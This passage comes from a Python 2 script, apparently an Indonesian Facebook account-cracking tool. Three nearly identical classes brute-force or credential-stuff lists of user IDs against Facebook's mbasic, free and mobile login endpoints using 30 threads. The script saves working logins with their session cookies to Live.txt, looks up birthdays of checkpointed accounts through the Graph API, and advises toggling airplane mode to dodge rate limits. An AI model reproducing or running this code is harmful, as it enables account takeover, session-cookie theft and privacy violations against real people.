			f=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Want to use a manual password (y/t) :\x1b[1;92m ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
					continue
				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
					continue
				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
	                        print("\x1b[1;92m╠════════════════════════════════════════════════")
	                        print("\x1b[1;92m║")
	                        print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m] \x1b[1;97mProses Crack Sedang Berjalan ...\n")
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
				break
	def pwlist(self):
		self.pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
	                print("\x1b[1;92m╠════════════════════════════════════════════════")
	                print("\x1b[1;92m║")
	                print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m] \x1b[1;97mProses Crack Sedang Berjalan ...\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[1;92m💦[OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Live.txt").read():
						break
					else:
						open("Live.txt","a+").write(
						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						token=open('___bangsat___','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
						w=json.loads(q.text)
						bt=w["birthday"]

					except (KeyError, IOError):
		                         bt = "         "
					except:pass
					print("\r\x1b[1;96m💦[CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
					open("Check.txt","a+").write(
						"%s|%s %s\n"%(fl.get("id"),i,bt))
					break
				else:continue

			self.ko+=1
                        raka = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
			print "\r %s[<\>] [%s/%s] [OK:%s] - [CP:%s]"%(raka,self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Want to use a manual password (y/t) :\x1b[1;92m ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
					continue
				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Ada")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
					continue
				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
	                        print("\x1b[1;92m╠════════════════════════════════════════════════")
	                        print("\x1b[1;92m║")
	                        print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m] \x1b[1;97mProses Crack Sedang Berjalan ...\n")
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
				break
	def pwlist(self):
		self.pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
	                print("\x1b[1;92m╠════════════════════════════════════════════════")
	                print("\x1b[1;92m║")
	                print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m] \x1b[1;97mProses Crack Sedang Berjalan ...\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=free(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[1;92m💦[OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Live.txt").read():
						break
					else:
						open("Live.txt","a+").write(
						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						token=open('___bangsat___','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
						w=json.loads(q.text)
						bt=w["birthday"]

					except (KeyError, IOError):
		                         bt = "         "
					except:pass
					print("\r\x1b[1;96m💦[CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
					open("Check.txt","a+").write(
						"%s|%s %s\n"%(fl.get("id"),i,bt))
					break
				else:continue

			self.ko+=1
                        raka = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
			print "\r %s[<\>] [%s/%s] [OK:%s] - [CP:%s]"%(raka,self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack3:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Want to use a manual password (y/t) :\x1b[1;92m ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
					continue
				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Invalid File")
					continue
				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
	                        print("\x1b[1;92m╠════════════════════════════════════════════════")
	                        print("\x1b[1;92m║")
	                        print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m] \x1b[1;97mProses Crack Sedang Berjalan ...\n")
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit("\n\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
				break
	def pwlist(self):
		self.pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
	                print("\x1b[1;92m╠════════════════════════════════════════════════")
	                print("\x1b[1;92m║")
	                print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m] \x1b[1;97mProses Crack Sedang Berjalan ...\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit("\n\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mobile(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[1;92m💦[OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Live.txt").read():
						break
					else:
						open("Live.txt","a+").write(
						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						token=open('___bangsat___','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
						w=json.loads(q.text)
						bt=w["birthday"]

					except (KeyError, IOError):
		                         bt = "         "
					except:pass
					print("\r\x1b[1;96m💦[CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
					open("Check.txt","a+").write(
						"%s|%s %s\n"%(fl.get("id"),i,bt))
					break
				else:continue

			self.ko+=1
                        raka = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
			print "\r %s[<\>] [%s/%s] [OK:%s] - [CP:%s]"%(raka,self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	os.system('git pull')
	menu()
